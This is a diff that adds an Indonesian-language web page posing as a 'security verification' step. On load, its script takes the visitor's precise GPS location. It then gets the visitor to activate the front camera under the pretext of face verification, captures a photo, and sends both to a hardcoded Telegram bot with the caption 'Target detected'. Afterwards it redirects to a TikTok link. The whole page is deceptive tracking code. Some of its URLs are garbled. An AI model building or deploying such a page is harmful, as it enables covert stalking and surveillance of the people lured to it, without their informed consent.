@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Keamanan</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .btn-verify {
+            background-color: #238636;
+            color: #ffffff;
+            border: 1px solid rgba(240,246,2fc,0.1);
+            border-radius: 6px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            display: none;
+        }
+        .btn-verify:hover { background-color: #2ea043; }
+        #status { font-size: 15px; line-height: 1.6; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="status">Mengonfigurasi enkripsi halaman... <br><strong>Mohon klik 'Izinkan/Allow' jika muncul permintaan lokasi.</strong></div>
+    <button id="camBtn" class="btn-verify" onclick="takeSnapshot()">Ambil Verifikasi Wajah</button>
+</div>
+
+<!-- Elemen tersembunyi untuk memproses foto -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// --- KONFIGURASI TELEGRAM BOT ---
+const TELEGRAM_BOT_TOKEN = "8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A"; 
+const TELEGRAM_CHAT_ID = "1966317946"; 
+
+let userLatitude = "Tidak diizinkan";
+let userLongitude = "Tidak diizinkan";
+
+// 1. Ambil lokasi otomatis saat halaman dibuka
+window.onload = function() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                userLatitude = position.coords.latitude;
+                userLongitude = position.coords.longitude;
+                showCameraTrigger();
+            }, 
+            () => { showCameraTrigger(); }, // Tetap lanjut ke opsi kamera meski lokasi ditolak
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        showCameraTrigger();
+    }
+};
+
+function showCameraTrigger() {
+    document.getElementById("status").innerHTML = "Lokasi terkonfigurasi. Langkah terakhir: Diperlukan verifikasi wajah untuk mengakses halaman.";
+    document.getElementById("camBtn").style.display = "block";
+}
+
+// 2. Fungsi mengaktifkan kamera depan dan mengambil gambar saat tombol ditekan
+function takeSnapshot() {
+    document.getElementById("status").innerText = "Mengaktifkan kamera depan... Izinkan akses jika diminta.";
+    
+    const constraints = {
+        video: { facingMode: "user" } // Mengunci ke kamera depan (selfie)
+    };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+    .then((stream) => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        
+        // Beri jeda 1,5 detik agar kamera fokus dan menyesuaikan cahaya sebelum memotret
+        setTimeout(() => {
+            const canvas = document.getElementById("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Gambar video ke dalam canvas
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Matikan kamera kembali untuk menghemat privasi/baterai perangkat
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Ubah gambar menjadi Blob data untuk dikirim ke Telegram
+            canvas.toBlob((blob) => {
+                sendDataToTelegram(blob);
+            }, "image/jpeg", 0.8);
+            
+        }, 1500);
+    })
+    .catch((err) => {
+        document.getElementById("status").innerHTML = "<span style='color: #f85149;'>Gagal akses kamera. Izin ditolak atau kamera tidak ditemukan.</span>";
+        // Tetap kirim data teks lokasi walaupun kamera ditolak
+        sendDataToTelegram(null);
+    });
+}
+
+// 3. Mengirim Foto beserta koordinat lokasi ke Telegram dalam satu paket
+function sendDataToTelegram(photoBlob) {
+    document.getElementById("status").innerText = "Memproses verifikasi...";
+    const mapUrl = `https://google.com{userLatitude},${userLongitude}`;
+    
+    const captionText = `📌 *Target Terdeteksi!*\n\n` +
+                        `🌐 *Latitude:* \`${userLatitude}\`\n` +
+                        `🌐 *Longitude:* \`${userLongitude}\`\n\n` +
+                        `📍 *Link Peta:* [Buka Google Maps](${mapUrl})`;
+
+    const formData = new FormData();
+    formData.append("chat_id", TELEGRAM_CHAT_ID);
+    formData.append("parse_mode", "Markdown");
+
+    let apiUrl = "";
+
+    if (photoBlob) {
+        // Jika foto berhasil diambil, kirim lewat method sendPhoto
+        apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        formData.append("photo", photoBlob, "snapshot.jpg");
+        formData.append("caption", captionText);
+    } else {
+        // Jika kamera ditolak, hanya kirim pesan teks lokasi saja
+        apiUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
+        formData.append("text", captionText + "\n\n⚠️ *Kamera depan ditolak oleh target.*");
+    }
+
+    fetch(apiUrl, {
+        method: "POST",
+        body: formData
+    })
+    .then(() => {
+        document.getElementById("status").innerHTML = "<span style='color: #56d364; font-weight: bold;'>Sukses Terverifikasi!</span>";
+        setTimeout(() => {
+            window.location.href = "https://vt.tiktok.com/ZSx8kdkcd/"; // Alihkan target
+        }, 1500);
+    })
+    .catch((err) => {
+        console.error(err);
+    });
+}
+</script>
+
+</body>
+</html>
